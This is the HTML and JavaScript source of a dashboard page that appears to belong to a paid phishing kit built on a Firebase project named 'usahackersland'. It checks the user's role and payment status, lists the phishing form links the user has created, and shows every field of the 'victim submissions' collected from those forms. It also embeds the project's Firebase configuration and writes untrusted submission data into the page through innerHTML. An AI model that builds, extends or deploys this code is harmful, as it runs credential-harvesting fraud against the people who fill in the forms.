<!DOCTYPE html>
<html>
<head>
  <title>ðŸ“‹ User Dashboard - Form Builder</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>

  <style>
    /* Existing styles */
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 0;
      position: relative;
      overflow-x: hidden;
      color: #0f0; /* make text green for matrix vibe */
    }
    .navbar {
      background: #0077cc;
      color: white;
      padding: 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: relative;
      z-index: 10;
    }
    .navbar h1 { margin: 0; font-size: 20px; }
    .navbar button {
      background: white;
      color: #0077cc;
      padding: 8px 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .dashboard {
      max-width: 900px;
      margin: 20px auto;
      padding: 20px;
      background: rgba(0,0,0,0.6);
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
      position: relative;
      z-index: 10;
      color: #0f0;
    }
    .section {
      margin-top: 30px;
    }
    h2 {
      border-bottom: 2px solid #0f0;
      padding-bottom: 8px;
    }
    .card {
      background: rgba(0,0,0,0.3);
      padding: 10px;
      border-radius: 6px;
      margin: 10px 0;
      color: #0f0;
      font-family: monospace;
    }
    a.button {
      display: inline-block;
      margin: 10px 5px;
      padding: 10px 20px;
      background: #0077cc;
      color: white;
      text-decoration: none;
      border-radius: 5px;
    }

    /* Matrix Canvas styling */
    #backgroundCanvas {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 1;
      pointer-events: none;
      background: black;
    }
  </style>
</head>
<body>
  <!-- Matrix background canvas -->
  <canvas id="backgroundCanvas"></canvas>

  <div class="navbar">
    <h1>ðŸ“‹ Form Builder Dashboard</h1>
    <button onclick="logout()">Logout</button>
  </div>  

  <div class="dashboard">
    <div>
      <a href="index.html" class="button">ðŸ›  Build Form</a>
      <a href="#forms" class="button">ðŸ”— My Links</a>
      <a href="#victims" class="button">ðŸ‘¥ View Victims</a>
    </div>

    <div class="section" id="forms">
      <h2>ðŸ”— My Created Links</h2>
      <div id="formsList">Loading forms...</div>
    </div>

    <div class="section" id="victims">
      <h2>ðŸ‘¥ Victim Submissions</h2>
      <div id="victimsList">Loading victims...</div>
    </div>
  </div>  

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    let currentUserEmail = null;

    auth.onAuthStateChanged(async (user) => {
      if (!user) {
        window.location.href = "login.html";
        return;
      }

      try {
        const docSnap = await db.collection("users").doc(user.uid).get();
        if (!docSnap.exists) {
          alert("No user record found. Contact support.");
          return auth.signOut();
        }
        const userData = docSnap.data();

        // Role check
        if (userData.role === "admin") {
          return window.location.href = "admin.html";
        }

        // Payment check
        if (userData.paid === false) {
          return window.location.href = "payment.html";
        }

        currentUserEmail = user.email;
        loadForms();
        loadVictims();
      } catch (err) {
        console.error(err);
      }
    });

    function logout() {
      auth.signOut().then(() => window.location.href = "login.html");
    }

    function loadForms() {
      const container = document.getElementById("formsList");
      db.collection("forms").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
        container.innerHTML = "";
        if (snapshot.empty) {
          container.innerHTML = "<p>No forms found.</p>";
          return;
        }
        snapshot.forEach(doc => {
          const data = doc.data();
          const div = document.createElement("div");
          div.className = "card";
          div.innerHTML = `
            <strong>Title:</strong> ${data.title || 'No title'}<br>
            <strong>Created:</strong> ${new Date(data.createdAt).toLocaleString()}<br>
            <strong>Link:</strong> <a href="form.html?id=${doc.id}" target="_blank">Open Form</a>
          `;
          container.appendChild(div);
        });
      });
    }

    function loadVictims() {
      const container = document.getElementById("victimsList");
      db.collection("victims").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
        container.innerHTML = "";
        if (snapshot.empty) {
          container.innerHTML = "<p>No victim submissions yet.</p>";
          return;
        }
        snapshot.forEach(doc => {
          const data = doc.data();
          const div = document.createElement("div");
          div.className = "card";
          div.innerHTML = `
            <strong>Date:</strong> ${new Date(data.createdAt).toLocaleString()}<br>
            ${Object.keys(data).map(k => `<strong>${k}:</strong> ${data[k]}`).join("<br>")}
          `;
          container.appendChild(div);
        });
      });
    }


    // Matrix background animation
    const canvas = document.getElementById('backgroundCanvas');
    const ctx = canvas.getContext('2d');
    let width, height;

    function resizeCanvas() {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
    const fontSize = 16;
    let columns = Math.floor(width / fontSize);
    const drops = new Array(columns).fill(1);

    function draw() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, width, height);

      ctx.fillStyle = '#0F0';
      ctx.font = fontSize + 'px monospace';

      for (let i = 0; i < drops.length; i++) {
        const text = letters.charAt(Math.floor(Math.random() * letters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > height && Math.random() > 0.975) {
          drops[i] = 0;
        }

        drops[i]++;
      }

      requestAnimationFrame(draw);
    }
    draw();

  </script>
</body>
</html>
